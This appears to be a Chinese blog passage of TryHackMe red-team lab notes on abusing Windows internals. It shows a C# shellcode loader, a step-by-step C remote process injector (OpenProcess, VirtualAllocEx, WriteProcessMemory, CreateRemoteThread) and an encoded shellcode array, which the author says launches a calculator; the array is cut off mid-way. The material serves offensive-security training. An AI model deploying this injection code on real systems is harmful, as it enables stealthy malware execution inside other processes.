<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 等待一个内核对象，直到该对象进入有信号状态或者指定的超时时间已到</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 在当前进程的虚拟地址空间内创建一个新的线程来执行一个指定的函数</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>Shellcode 加载器的具体过程：</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 1分配一个可以容纳 shellcode 大小的内存区域，并且立即提交并且赋予可执行和读写权限</span></span>
<span class="line"><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 把 shellcode 复制到这个内存区域</span></span>
<span class="line"><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 2初始化句柄，线程 ID，线程参数</span></span>
<span class="line"><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 指向线程参数的指针，这里为空</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 也可以在下面的那个调用里面直接传一个 IntPtr.Zero</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 但是上面两个是必须的，函数创建之后会把线程句柄和线程 ID 写回</span></span>
<span class="line"><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">pinfo</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 3创建一个新线程来执行 shellcode</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// CreateThread 是一个 Win32 API 函数，它在新线程中执行一个函数（这里是我们的 shellcode）</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 参数依次为：线程安全属性、栈大小、线程起始地址、线程参数、创建标志、线程 ID</span></span>
<span class="line"><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">funcAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">pinfo</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 4等待线程执行完成</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// WaitForSingleObject 是一个 Win32 API 函数，用于等待一个对象（这里是我们的线程）进入有信号状态或超时</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 0xFFFFFFFF 代表无限等待，直到线程执行完毕</span></span>
<span class="line"><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
<h1>Abusing Windows Internals</h1>
<p>“Windows 内部”一词可涵盖 Windows 操作系统后端的所有组件。这包括进程、文件格式、COM（组件对象模型）、任务调度、I/O 系统等。本房间将重点介绍如何滥用和利用进程及其组件、DLL（动态链接库）和 PE（可执行文件）格式。</p>
<h2 id="Abusing-Processes-滥用进程">Abusing Processes 滥用进程</h2>
<p>一个应用程序可以包含一个或者多个进程，而一个进程有多个子组件，他们可以直接和内存或虚拟内存交互，下面是每个进程的关键组件和用途，前面的 Windows Internals 房间我已经介绍过了，这里直接复制过来了。</p>
<table>
<thead>
<tr>
<th>进程组件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>私有虚拟内存空间</td>
<td>分配给进程的虚拟内存地址</td>
</tr>
<tr>
<td>可执行程序</td>
<td>定义存储在虚拟内存空间中的代码和数据</td>
</tr>
<tr>
<td>打开的句柄</td>
<td>定义进程可访问的系统资源的句柄</td>
</tr>
<tr>
<td>安全上下文</td>
<td>访问令牌定义了用户， 安全组，权限和其他安全信息</td>
</tr>
<tr>
<td>进程 ID</td>
<td>每个进程独有的数字标识符</td>
</tr>
<tr>
<td>线程</td>
<td>进程计划执行的部分</td>
</tr>
</tbody>
</table>
<p>进程注入通常是一个总括性术语，用于描述通过合法功能或组件将恶意代码注入进程。在本房间中，我们将重点关注以下四种不同类型的进程注入。</p>
<table>
<thead>
<tr>
<th><strong>Injection Type</strong></th>
<th><strong>Function</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/012/">Process Hollowing</a> 进程挖空</td>
<td>把代码注入进暂停并且挖空的进程中</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking</a> 线程执行劫持</td>
<td>把代码注入进暂停的线程中</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/001/">Dynamic-link Library Injection</a> 动态链接库注入</td>
<td>把 DLL 注入进正在运行的进程中</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/002/">Portable Executable Injection</a> 可执行文件注入</td>
<td>将指向恶意函数的 PE 镜像自注入到目标进程中</td>
</tr>
</tbody>
</table>
<p><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a> 中概述了许多其他形式的进程注入。</p>
<p>最基本的进程注入形式是 shellcode 注入，可以分为四个步骤：</p>
<ol>
<li>以所有访问权限打开目标进程。</li>
<li>为 shellcode 分配目标进程内存。</li>
<li>将 shellcode 写入目标进程中已分配的内存。</li>
<li>使用远程线程执行 shellcode。</li>
</ol>
<p>这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。</p>
<img src="/thm_rthe/ba04c5ef220c10b3e174bd1ca77959c6.png" class="" title="img">
<p>这里会分解一个 Shellcode 注入器的执行过程，这里和我们之前玩的注入一个弹窗是一样的。</p>
<p>第一步，用 <code>OpenProcess</code> 打开目标进程：</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">processHandle </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	PROCESS_ALL_ACCESS</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Defines access rights</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Target handle will not be inhereted</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv[</span><span style="color: #D19A66">1</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">))</span><span style="color: #7F848E; font-style: italic"> // Local process supplied by command-line arguments </span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>第二步，分配内存：</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">sizeof</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Region size of memory allocation</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #E06C75"> MEM_COMMIT</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages</span></span>
<span class="line"><span style="color: #E06C75">	PAGE_EXECUTE_READWRITE</span><span style="color: #7F848E; font-style: italic"> // Enables execution and read/write access to the commited pages</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>第三步，写入 shellcode 到分配好的内存区域中：</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span>
<span class="line"><span style="color: #E06C75">	remoteBuffer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Allocated memory region</span></span>
<span class="line"><span style="color: #E06C75">	shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Data to write</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">sizeof</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">shellcode</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // byte size of data</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>第四步，用 <code>CreateRemoteThread</code> 执行：</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	processHandle</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Opened target process</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Default size of the stack</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">LPTHREAD_START_ROUTINE</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75; font-style: italic">remoteBuffer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Pointer to the starting address of the thread</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Ran immediately after creation</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h3 id="远程代码注入实战">远程代码注入实战</h3>
<p>这里的 Shellcode 是弹计算器的，执行会被卡巴拦未授权的注入。</p>
<style>.wxbejlpjjkbq{zoom:33%;}</style><img onerror="imgOnError(this);" data-fancybox="gallery" src="/thm_rthe/image-20250822023032418.png" class="wxbejlpjjkbq" alt="image-20250822023032418" data-caption="image-20250822023032418" loading="lazy">
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">db</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">74</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">24</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ab</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c9</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">30</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">31</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">18</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">83</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">04</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">03</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">af</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">57</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">03</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ad</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">6e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">06</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e3</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">58</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ba</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">be</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fa</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">34</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">fc</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">26</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">85</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">77</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">72</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">79</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f9</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d2</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">95</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">90</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ea</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">67</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">75</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span 